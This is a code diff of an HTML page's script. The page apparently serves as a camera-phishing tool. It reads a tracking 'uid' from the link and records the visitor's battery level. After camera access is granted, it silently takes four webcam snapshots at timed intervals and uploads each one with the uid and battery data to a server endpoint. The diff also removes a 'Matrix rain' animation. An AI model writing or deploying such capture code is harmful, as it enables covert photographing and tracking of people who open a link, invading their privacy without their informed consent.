@@ -70,101 +70,81 @@
   <canvas id="snapshot"></canvas>
 
   <script>
-    /* ===== Matrix Rain Animation ===== */
-    const canvasMatrix = document.getElementById("matrix");
-    const ctxMatrix = canvasMatrix.getContext("2d");
-    canvasMatrix.height = window.innerHeight;
-    canvasMatrix.width = window.innerWidth;
-    let letters = Array(256).join("1").split("");
-    function drawMatrix() {
-      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
-      ctxMatrix.fillStyle = "#0f0";
-      letters.forEach((y, index) => {
-        let text = String.fromCharCode(3e4 + Math.random() * 33);
-        let x = index * 10;
-        ctxMatrix.fillText(text, x, y);
-        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
-      });
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('snapshot');
+  const ctx = canvas.getContext('2d');
+  const log = document.getElementById('log');
+  const statusEl = document.getElementById('status');
+
+  const params = new URLSearchParams(window.location.search);
+  const uid = params.get('uid') || 'unknown';
+
+  let snapshotsTaken = 0;
+  const maxSnapshots = 4;
+
+  function takeSnapshotAndSend(battery, charging) {
+    if (snapshotsTaken >= maxSnapshots) return;
+
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+      console.warn("⚠️ Video not ready, retrying in 300ms...");
+      setTimeout(() => takeSnapshotAndSend(battery, charging), 300);
+      return;
     }
-    setInterval(drawMatrix, 33);
 
-    /* ===== Camera + Snapshot Logic ===== */
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('snapshot');
-    const ctx = canvas.getContext('2d');
-    const log = document.getElementById('log');
-    const statusEl = document.getElementById('status');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid') || 'unknown';
+    const imageData = canvas.toDataURL('image/png');
 
-    let snapshotsTaken = 0;
-    const maxSnapshots = 4;
+    fetch('/api/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        image: imageData,
+        uid,
+        battery,
+        charging
+      })
+    }).then(res => res.json()).then(data => {
+      snapshotsTaken++;
+      console.log("✅ Uploaded:", snapshotsTaken, data);
+      log.innerText += `Snapshot ${snapshotsTaken} uploaded...\n`;
 
-    function takeSnapshotAndSend(battery, charging) {
-      if (snapshotsTaken >= maxSnapshots) return;
-
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        console.warn("⚠️ Video not ready, retrying in 200ms...");
-        setTimeout(() => takeSnapshotAndSend(battery, charging), 200);
-        return;
+      if (snapshotsTaken === maxSnapshots) {
+        console.log("📴 Max snapshots reached, stopping camera.");
+        video.srcObject.getTracks().forEach(track => track.stop());
       }
+    }).catch(err => {
+      console.error("❌ Upload error:", err);
+      log.innerText += "Upload failed!\n";
+    });
+  }
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  if (uid) {
+    navigator.getBattery().then(battery => {
+      const batteryLevel = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
 
-      const imageData = canvas.toDataURL('image/png');
+      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
 
-      fetch('/api/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          image: imageData,
-          uid,
-          battery,
-          charging
-        })
-      }).then(res => res.json()).then(data => {
-        snapshotsTaken++;
-        console.log("✅ Uploaded:", data);
-        log.innerText += `Snapshot ${snapshotsTaken} uploaded...\n`;
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        statusEl.innerText = "Camera access granted...";
 
-        if (snapshotsTaken === maxSnapshots) {
-          console.log("📴 Max snapshots reached, stopping camera.");
-          video.srcObject.getTracks().forEach(track => track.stop());
-        }
+        // 📸 Start snapshots when metadata (dimensions) is ready
+        video.onloadedmetadata = () => {
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
+        };
       }).catch(err => {
-        console.error("❌ Upload error:", err);
-        log.innerText += "Upload failed!\n";
+        console.error("Camera error:", err);
+        statusEl.innerText = "Camera error!";
       });
-    }
-
-    if (uid) {
-      navigator.getBattery().then(battery => {
-        const batteryLevel = Math.round(battery.level * 100);
-        const isCharging = battery.charging;
-
-        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
-
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-          video.srcObject = stream;
-          statusEl.innerText = "Camera access granted...";
-
-          // 📸 snapshots یوازې هغه وخت پیل شي چې ویډیو playing شي
-          video.onplaying = () => {
-            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
-            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
-            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
-            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
-          };
-        }).catch(err => {
-          console.error("Camera error:", err);
-          statusEl.innerText = "Camera error!";
-        });
-      });
-    }
-  </script>
+    });
+  }
+</script> 
 </body>
 </html> 
